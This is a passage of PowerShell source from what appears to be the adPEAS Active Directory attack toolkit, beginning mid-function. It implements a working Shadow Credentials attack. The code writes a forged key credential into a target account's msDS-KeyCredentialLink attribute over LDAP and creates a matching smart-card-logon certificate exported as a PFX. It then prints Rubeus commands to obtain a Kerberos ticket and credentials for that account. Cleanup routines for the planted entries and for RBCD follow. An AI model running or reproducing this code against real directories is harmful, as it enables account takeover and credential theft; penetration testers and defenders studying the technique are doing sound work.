	            if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
	                throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
	            }
	            if ($PassThru) {
	                return [PSCustomObject]@{
	                    Operation = "ClearRBCD"
	                    $TargetType = $TargetSAMAccountName
	                    DistinguishedName = $TargetDN
	                    ClearedCount = $ACECount
	                    Success = $true
	                    Message = "All $ACECount RBCD entries successfully cleared"
	                }
	            } else {
	                Show-Line "Successfully cleared all $ACECount RBCD entries from: $TargetSAMAccountName" -Class Hint
	            }
	        } else {
	            if ($PassThru) {
	                return [PSCustomObject]@{
	                    Operation = "ClearRBCD"
	                    $TargetType = $TargetSAMAccountName
	                    DistinguishedName = $TargetDN
	                    PrincipalCount = $ACECount
	                    ExistingPrincipals = $ConfiguredPrincipals
	                    Success = $false
	                    Message = "Multiple principals found. Use -Principal <name> or -Force to proceed."
	                }
	            } else {
	                Write-Warning "[!] Multiple RBCD principals ($ACECount) found on: $TargetSAMAccountName"
	                Show-EmptyLine
	                Show-Line "To remove a specific principal, use: -Principal <name>" -Class Note
	                Show-Line "To remove ALL principals, use: -Force" -Class Note
	                Show-EmptyLine
	                Show-Line "Existing RBCD principals:" -Class Hint
	                $index = 1
	                foreach ($configuredPrincipal in $ConfiguredPrincipals) {
	                    Show-KeyValue "[$index] Principal:" "$($configuredPrincipal.Name)"
	                    Show-KeyValue "    SID:" "$($configuredPrincipal.SID)"
	                    Show-EmptyLine
	                    $index++
	                }
	            }
	        }
	    } catch {
	        throw "Failed to clear RBCD: $_"
	    }
	}
}
function Invoke-ShadowCredentialOperation {
	[CmdletBinding()]
	param(
	    [Parameter(Mandatory)]
	    [string]$TargetDN,
	    [Parameter(Mandatory)]
	    [string]$TargetSAMAccountName,
	    [Parameter(Mandatory)]
	    [ValidateSet('User', 'Computer')]
	    [string]$TargetType,
	    [string]$TargetUPN,
	    [Parameter(ParameterSetName='Add', Mandatory)]
	    [switch]$AddShadowCredential,
	    [Parameter(ParameterSetName='Clear', Mandatory)]
	    [switch]$ClearShadowCredentials,
	    [string]$DeviceID,
	    [Parameter(ParameterSetName='Clear')]
	    [switch]$Force,
	    [switch]$NoPassword,
	    [switch]$PassThru
	)
	$FunctionPrefix = "[Invoke-ShadowCredentialOperation]"
	if ($PSCmdlet.ParameterSetName -eq 'Add') {
	    $RSA = $null
	    try {
	        $RSA = [System.Security.Cryptography.RSA]::Create(2048)
	        $DeviceGUID = if ($DeviceID) { [GUID]$DeviceID } else { [GUID]::NewGuid() }
	        $KeyGUID = [GUID]::NewGuid()
	        $RSAParams = $RSA.ExportParameters($false)  # false = public key only
	        $KeyBlob = New-Object System.Collections.ArrayList
	        [void]$KeyBlob.AddRange([BitConverter]::GetBytes([UInt32]0x31415352))
	        [void]$KeyBlob.AddRange([BitConverter]::GetBytes([UInt32]2048))
	        [void]$KeyBlob.AddRange([BitConverter]::GetBytes([UInt32]$RSAParams.Exponent.Length))
	        [void]$KeyBlob.AddRange([BitConverter]::GetBytes([UInt32]$RSAParams.Modulus.Length))
	        [void]$KeyBlob.AddRange([BitConverter]::GetBytes([UInt32]0))
	        [void]$KeyBlob.AddRange([BitConverter]::GetBytes([UInt32]0))
	        [void]$KeyBlob.AddRange($RSAParams.Exponent)
	        [void]$KeyBlob.AddRange($RSAParams.Modulus)
	        $PublicKeyBytes = [byte[]]$KeyBlob.ToArray()
	        $SHA256 = [System.Security.Cryptography.SHA256]::Create()
	        $KeyHash = $SHA256.ComputeHash($PublicKeyBytes)
	        $SHA256.Dispose()
	        $EntriesAfterKeyHash = New-Object System.Collections.ArrayList
	        $CurrentFileTime = [DateTime]::UtcNow.ToFileTimeUtc()
	        Add-KeyCredentialLinkEntry -EntryType 0x03 -Data $PublicKeyBytes -Target $EntriesAfterKeyHash
	        Add-KeyCredentialLinkEntry -EntryType 0x04 -Data @([byte]0x01) -Target $EntriesAfterKeyHash
	        Add-KeyCredentialLinkEntry -EntryType 0x05 -Data @([byte]0x00) -Target $EntriesAfterKeyHash
	        Add-KeyCredentialLinkEntry -EntryType 0x06 -Data $DeviceGUID.ToByteArray() -Target $EntriesAfterKeyHash
	        Add-KeyCredentialLinkEntry -EntryType 0x07 -Data @([byte]0x01, [byte]0x00) -Target $EntriesAfterKeyHash
	        Add-KeyCredentialLinkEntry -EntryType 0x08 -Data ([BitConverter]::GetBytes($CurrentFileTime)) -Target $EntriesAfterKeyHash
	        Add-KeyCredentialLinkEntry -EntryType 0x09 -Data ([BitConverter]::GetBytes($CurrentFileTime)) -Target $EntriesAfterKeyHash
	        $SHA256ForHash = [System.Security.Cryptography.SHA256]::Create()
	        $KeyHashValue = $SHA256ForHash.ComputeHash([byte[]]$EntriesAfterKeyHash.ToArray())
	        $SHA256ForHash.Dispose()
	        $KeyCredentialEntries = New-Object System.Collections.ArrayList
	        Add-KeyCredentialLinkEntry -EntryType 0x01 -Data $KeyHash -Target $KeyCredentialEntries
	        Add-KeyCredentialLinkEntry -EntryType 0x02 -Data $KeyHashValue -Target $KeyCredentialEntries
	        [void]$KeyCredentialEntries.AddRange($EntriesAfterKeyHash.ToArray())
	        $KeyCredentialBlob = New-Object System.Collections.ArrayList
	        [void]$KeyCredentialBlob.AddRange([BitConverter]::GetBytes([UInt32]0x00000200))
	        [void]$KeyCredentialBlob.AddRange($KeyCredentialEntries.ToArray())
	        $KeyCredentialBytes = [byte[]]$KeyCredentialBlob.ToArray()
	        $HexString = [BitConverter]::ToString($KeyCredentialBytes) -replace '-', ''
	        $DNBinaryValue = "B:$($HexString.Length):$HexString`:$TargetDN"
	        $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
	        $ModifyRequest.DistinguishedName = $TargetDN
	        $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
	        $Modification.Name = "msDS-KeyCredentialLink"
	        $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Add
	        $Modification.Add($DNBinaryValue) | Out-Null
	        $ModifyRequest.Modifications.Add($Modification) | Out-Null
	        $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
	        if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
	            throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
	        }
	        if ($NoPassword) {
	            $CertPassword = $null
	        }
	        else {
	            $CertPassword = New-SafePassword -Length 20
	        }
	        try {
	            [void][System.Security.Cryptography.X509Certificates.CertificateRequest]
	            $SubjectName = "CN=$TargetSAMAccountName"
	            $Subject = New-Object System.Security.Cryptography.X509Certificates.X500DistinguishedName($SubjectName)
	            $CertRequest = New-Object System.Security.Cryptography.X509Certificates.CertificateRequest(
	                $Subject,
	                $RSA,
	                [System.Security.Cryptography.HashAlgorithmName]::SHA256,
	                [System.Security.Cryptography.RSASignaturePadding]::Pkcs1
	            )
	            $OidCollection = New-Object System.Security.Cryptography.OidCollection
	            [void]$OidCollection.Add((New-Object System.Security.Cryptography.Oid("1.3.6.1.5.5.7.3.2")))  # Client Authentication
	            [void]$OidCollection.Add((New-Object System.Security.Cryptography.Oid("1.3.6.1.4.1.311.20.2.2")))  # Smart Card Logon
	            $EkuExtension = New-Object System.Security.Cryptography.X509Certificates.X509EnhancedKeyUsageExtension($OidCollection, $false)
	            $CertRequest.CertificateExtensions.Add($EkuExtension)
	            $KeyUsageExtension = New-Object System.Security.Cryptography.X509Certificates.X509KeyUsageExtension(
	                ([System.Security.Cryptography.X509Certificates.X509KeyUsageFlags]::DigitalSignature -bor [System.Security.Cryptography.X509Certificates.X509KeyUsageFlags]::KeyEncipherment),
	                $false
	            )
	            $CertRequest.CertificateExtensions.Add($KeyUsageExtension)
	            $CertUPN = if ($TargetUPN) {
	                $TargetUPN
	            } else {
	                "$TargetSAMAccountName@$($Script:LDAPContext.Domain.ToUpper())"
	            }
	            $UPNBytes = [System.Text.Encoding]::UTF8.GetBytes($CertUPN)
	            $UPNOID = @(0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x14, 0x02, 0x03)
	            $UTF8Tag = 0x0C
	            $UPNValueASN1 = @($UTF8Tag) + $(if ($UPNBytes.Length -lt 128) { @([byte]$UPNBytes.Length) } else { @(0x82, [byte](($UPNBytes.Length -shr 8) -band 0xFF), [byte]($UPNBytes.Length -band 0xFF)) }) + $UPNBytes
	            $Context0Content = [byte[]]$UPNValueASN1
	            $Context0 = @(0xA0) + $(if ($Context0Content.Length -lt 128) { @([byte]$Context0Content.Length) } else { @(0x82, [byte](($Context0Content.Length -shr 8) -band 0xFF), [byte]($Context0Content.Length -band 0xFF)) }) + $Context0Content
	            $OtherNameContent = [byte[]]$UPNOID + [byte[]]$Context0
	            $GeneralName = @(0xA0) + $(if ($OtherNameContent.Length -lt 128) { @([byte]$OtherNameContent.Length) } else { @(0x82, [byte](($OtherNameContent.Length -shr 8) -band 0xFF), [byte]($OtherNameContent.Length -band 0xFF)) }) + $OtherNameContent
	            $GeneralNamesContent = [byte[]]$GeneralName
	            $SANValue = @(0x30) + $(if ($GeneralNamesContent.Length -lt 128) { @([byte]$GeneralNamesContent.Length) } else { @(0x82, [byte](($GeneralNamesContent.Length -shr 8) -band 0xFF), [byte]($GeneralNamesContent.Length -band 0xFF)) }) + $GeneralNamesContent
	            $SANExtension = New-Object System.Security.Cryptography.X509Certificates.X509Extension(
	                (New-Object System.Security.Cryptography.Oid("2.5.29.17")),
	                [byte[]]$SANValue,
	                $false
	            )
	            $CertRequest.CertificateExtensions.Add($SANExtension)
	            $NotBefore = [DateTime]::UtcNow.AddDays(-1)
	            $NotAfter = [DateTime]::UtcNow.AddYears(10)
	            $Cert = $CertRequest.CreateSelfSigned($NotBefore, $NotAfter)
	        } catch {
	            throw "Failed to create certificate: .NET 4.7.2+ with CertificateRequest is required for Shadow Credentials"
	        }
	        if ($CertPassword) {
	            $SecureCertPassword = ConvertTo-SecureString -String $CertPassword -AsPlainText -Force
	            $PFXBytes = $Cert.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx, $SecureCertPassword)
	        }
	        else {
	            $PFXBytes = $Cert.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx)
	        }
	        $Timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
	        $PFXPath = "${TargetSAMAccountName}_$Timestamp.pfx"
	        $exportResult = Export-adPEASFile -Path $PFXPath -Content $PFXBytes -Type Binary -SanitizeFilename -Force
	        if (-not $exportResult.Success) {
	            Write-Error "$FunctionPrefix Failed to save PFX: $($exportResult.Message)"
	            return $null
	        }
	        $PFXPath = $exportResult.Path
	        if ($Cert) { $Cert.Dispose() }
	        if ($PassThru) {
	            return [PSCustomObject]@{
	                Operation = "AddShadowCredential"
	                $TargetType = $TargetSAMAccountName
	                DistinguishedName = $TargetDN
	                DeviceID = $DeviceGUID.ToString()
	                KeyID = [Convert]::ToBase64String($KeyHash)
	                PFXPath = $PFXPath
	                PFXPassword = if ($CertPassword) { $CertPassword } else { $null }
	                Success = $true
	                Message = "Shadow Credential successfully added. Certificate saved as PFX."
	            }
	        } else {
	            Show-Line "Successfully added Shadow Credential to: $TargetSAMAccountName" -Class Hint
	            Show-KeyValue "Device ID:" $DeviceGUID
	            Show-KeyValue "Key ID:" $([Convert]::ToBase64String($KeyHash))
	            Show-KeyValue "PFX Path:" $PFXPath
	            if ($CertPassword) {
	                Show-KeyValue "PFX Password:" $CertPassword
	            } else {
	                Show-KeyValue "PFX Password:" "(none)" -Class Note
	            }
	            Show-EmptyLine
	            Show-Line "Usage with Rubeus:" -Class Note
	            if ($CertPassword) {
	                Show-Line "Rubeus.exe asktgt /user:$TargetSAMAccountName /certificate:$PFXPath /password:`"$CertPassword`" /domain:$($Script:LDAPContext.Domain) /dc:$($Script:LDAPContext.Server) /getcredentials /show"
	            } else {
	                Show-Line "Rubeus.exe asktgt /user:$TargetSAMAccountName /certificate:$PFXPath /domain:$($Script:LDAPContext.Domain) /dc:$($Script:LDAPContext.Server) /getcredentials /show"
	            }
	            Show-EmptyLine
	            Show-Line "Usage with adPEAS Connect-adPEAS:" -Class Note
	            if ($CertPassword) {
	                Show-Line "Connect-adPEAS -Domain $($Script:LDAPContext.Domain) -Certificate `'$PFXPath`' -CertificatePassword `'$CertPassword`'"
	            } else {
	                Show-Line "Connect-adPEAS -Domain $($Script:LDAPContext.Domain) -Certificate `'$PFXPath`'"
	            }
	        }
	    } catch {
	        throw "Failed to add Shadow Credential: $_"
	    } finally {
	        if ($RSA) { $RSA.Dispose() }
	    }
	}
	else {
	    try {
	        $SearchResult = Invoke-LDAPSearch -Filter "(distinguishedName=$TargetDN)" -Properties @('msDS-KeyCredentialLink') -SizeLimit 1
	        $ExistingCredentials = @()
	        if ($SearchResult -and $SearchResult.'msDS-KeyCredentialLink') {
	            $RawValues = $SearchResult.'msDS-KeyCredentialLink'
	            if ($RawValues -is [string]) {
	                $ExistingCredentials = @($RawValues)
	            } else {
	                foreach ($val in $RawValues) {
	                    $ExistingCredentials += $val.ToString()
	                }
	            }
	        }
	        $CredentialCount = $ExistingCredentials.Count
	        if ($CredentialCount -eq 0) {
	            if ($PassThru) {
	                return [PSCustomObject]@{
	                    Operation = "ClearShadowCredentials"
	                    $TargetType = $TargetSAMAccountName
	                    DistinguishedName = $TargetDN
	                    Success = $true
	                    Message = "No Shadow Credentials to clear"
	                }
	            } else {
	                Show-Line "No Shadow Credentials found on: $TargetSAMAccountName" -Class Note
	            }
	            return $null
	        }
	        $ParsedCredentials = @()
	        foreach ($CredString in $ExistingCredentials) {
	            if ($CredString -match '^B:(\d+):([0-9A-Fa-f]+):(.+)$') {
	                $HexData = $Matches[2]
	                $KeyCredBytes = [byte[]]::new($HexData.Length / 2)
	                for ($i = 0; $i -lt $HexData.Length; $i += 2) {
	                    $KeyCredBytes[$i / 2] = [Convert]::ToByte($HexData.Substring($i, 2), 16)
	                }
	                $ParsedCred = @{
	                    RawString = $CredString
	                    DeviceID = $null
	                    KeyID = $null
	                    CreationTime = $null
	                }
	                $offset = 4
	                while ($offset + 3 -le $KeyCredBytes.Length) {
	                    $EntryLength = [BitConverter]::ToUInt16($KeyCredBytes, $offset)
	                    $offset += 2
	                    $EntryType = $KeyCredBytes[$offset]
	                    $offset += 1
	                    if ($offset + $EntryLength -gt $KeyCredBytes.Length) { break }
	                    $EntryData = if ($EntryLength -gt 0) { [byte[]]$KeyCredBytes[$offset..($offset + $EntryLength - 1)] } else { @() }
	                    switch ($EntryType) {
	                        0x01 { $ParsedCred.KeyID = [Convert]::ToBase64String($EntryData) }
	                        0x06 {
	                            if ($EntryData.Length -eq 16) {
	                                $ParsedCred.DeviceID = (New-Object GUID(,[byte[]]$EntryData)).ToString()
	                            }
	                        }
	                        0x09 {
	                            if ($EntryData.Length -eq 8) {
	                                $FileTime = [BitConverter]::ToInt64($EntryData, 0)
	                                if ($FileTime -gt 0) {
	                                    $ParsedCred.CreationTime = [DateTime]::FromFileTimeUtc($FileTime)
	                                }
	                            }
	                        }
	                    }
	                    $offset += $EntryLength
	                }
	                $ParsedCredentials += [PSCustomObject]$ParsedCred
	            }
	        }
	        if ($DeviceID) {
	            $NormalizedInputGUID = $null
	            $CleanInput = $DeviceID.Trim().ToLower()
	            if ($CleanInput -match '^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$') {
	                $NormalizedInputGUID = $CleanInput
	            }
	            elseif ($CleanInput -match '^[0-9a-f]{32}$') {
	                $rawBytes = [byte[]]::new(16)
	                for ($i = 0; $i -lt 32; $i += 2) {
	                    $rawBytes[$i / 2] = [Convert]::ToByte($CleanInput.Substring($i, 2), 16)
	                }
	                $NormalizedInputGUID = (New-Object GUID(,[byte[]]$rawBytes)).ToString().ToLower()
	            }
	            else {
	                $NormalizedInputGUID = $CleanInput.Replace('-', '')
	            }
	            $CredToRemoveIndex = -1
	            for ($idx = 0; $idx -lt $ParsedCredentials.Count; $idx++) {
	                $pc = $ParsedCredentials[$idx]
	                if (-not $pc.DeviceID) { continue }
	                $StoredGUID = $pc.DeviceID.ToLower()
	                if (($StoredGUID -eq $NormalizedInputGUID) -or
	                    ($StoredGUID.Replace('-', '') -eq $NormalizedInputGUID.Replace('-', ''))) {
	                    $CredToRemoveIndex = $idx
	                    break
	                }
	            }
	            if ($CredToRemoveIndex -eq -1) {
	                if ($PassThru) {
	                    return [PSCustomObject]@{
	                        Operation = "ClearShadowCredentials"
	                        $TargetType = $TargetSAMAccountName
	                        DistinguishedName = $TargetDN
	                        Success = $false
	                        Message = "DeviceID '$DeviceID' not found"
	                        ExistingCredentials = $ParsedCredentials
	                    }
	                } else {
	                    Write-Warning "[!] No Shadow Credential with DeviceID '$DeviceID' found on: $TargetSAMAccountName"
	                    Show-EmptyLine
	                    Show-Line "Existing Shadow Credentials:" -Class Hint
	                    foreach ($cred in $ParsedCredentials) {
	                        Show-KeyValue "DeviceID:" $cred.DeviceID
	                        Show-KeyValue "KeyID:" $cred.KeyID
	                        if ($cred.CreationTime) {
	                            Show-KeyValue "Created:" "$($cred.CreationTime.ToString('yyyy-MM-dd HH:mm:ss')) UTC"
	                        }
	                        Show-EmptyLine
	                    }
	                }
	                return $null
	            }
	            $ValueToRemove = $ParsedCredentials[$CredToRemoveIndex].RawString
	            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
	            $ModifyRequest.DistinguishedName = $TargetDN
	            $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
	            $Modification.Name = "msDS-KeyCredentialLink"
	            $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete
	            $Modification.Add($ValueToRemove) | Out-Null
	            $ModifyRequest.Modifications.Add($Modification) | Out-Null
	            $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
	            if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
	                throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
	            }
	            if ($PassThru) {
	                return [PSCustomObject]@{
	                    Operation = "ClearShadowCredentials"
	                    $TargetType = $TargetSAMAccountName
	                    DistinguishedName = $TargetDN
	                    RemovedDeviceID = $DeviceID
	                    RemainingCount = $CredentialCount - 1
	                    Success = $true
	                    Message = "Shadow Credential with DeviceID '$DeviceID' removed"
	                }
	            } else {
	                Show-Line "Successfully removed Shadow Credential with DeviceID '$DeviceID' from: $TargetSAMAccountName" -Class Hint
	            }
	        } elseif ($CredentialCount -eq 1) {
	            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
	            $ModifyRequest.DistinguishedName = $TargetDN
	            $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
	            $Modification.Name = "msDS-KeyCredentialLink"
	            $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete
	            $ModifyRequest.Modifications.Add($Modification) | Out-Null
	            $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
	            if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
	                throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
	            }
	            if ($PassThru) {
	                return [PSCustomObject]@{
	                    Operation = "ClearShadowCredentials"
	                    $TargetType = $TargetSAMAccountName
	                    DistinguishedName = $TargetDN
	                    ClearedCount = 1
	                    Success = $true
	                    Message = "Shadow Credential successfully cleared"
	                }
	            } else {
	                Show-Line "Successfully cleared Shadow Credential from: $TargetSAMAccountName" -Class Hint
	            }
	        } elseif ($Force) {
	            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
	            $ModifyRequest.DistinguishedName = $TargetDN
	            $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
	            $Modification.Name = "msDS-KeyCredentialLink"
	            $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete
	            $ModifyRequest.Modifications.Add($Modification) | Out-Null
	            $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
	            if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
	                throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
	            }
	            if ($PassThru) {
	                return [PSCustomObject]@{
	                    Operation = "ClearShadowCredentials"
	                    $TargetType = $TargetSAMAccountName
	                    DistinguishedName = $TargetDN
	                    ClearedCount = $CredentialCount
	                    Success = $true
	                    Message = "All $CredentialCount Shadow Credentials successfully cleared"
	                }
	            } else {
	                Show-Line "Successfully cleared all $CredentialCount Shadow Credentials from: $TargetSAMAccountName" -Class Hint
	            }
	        } else {
	            if ($PassThru) {
	                return [PSCustomObject]@{
	                    Operation = "ClearShadowCredentials"
	                    $TargetType = $TargetSAMAccountName
	                    DistinguishedName = $TargetDN
	                    CredentialCount = $CredentialCount
	                    ExistingCredentials = $ParsedCredentials
	                    Success = $false
	                    Message = "Multiple credentials found. Use -DeviceID <GUID> or -Force to proceed."
	                }
	            } else {
	                Write-Warning "[!] Multiple Shadow Credentials ($CredentialCount) found on: $TargetSAMAccountName"
	                Show-EmptyLine
	                Show-Line "To delete a specific credential, use: -DeviceID <GUID>" -Class Note
	                Show-Line "To delete ALL credentials, use: -Force" -Class Note
	                Show-EmptyLine
	                Show-Line "Existing Shadow Credentials:" -Class Hint
	                $index = 1
	                foreach ($cred in $ParsedCredentials) {
	                    Show-KeyValue "[$index] DeviceID:" $cred.DeviceID
	                    Show-KeyValue "    KeyID:" $cred.KeyID
	                    if ($cred.CreationTime) {
	                        Show-KeyValue "    Created:" "$($cred.CreationTime.ToString('yyyy-MM-dd HH:mm:ss')) UTC"
	                    }
	                    Show-EmptyLine
	                    $index++
	                }
	            }
	        }
	    } catch {
	        throw "Failed to clear Shadow Credentials: $_"
	    }
	}
}
function Add-KeyCredentialLinkEntry {
	param(
	    [byte]$EntryType,
	    [byte[]]$Data,
	    [System.Collections.ArrayList]$Target
	)
	[void]$Target.AddRange([BitConverter]::GetBytes([UInt16]$Data.Length))
	[void]$Target.Add($EntryType)
	[void]$Target.AddRange($Data)
}
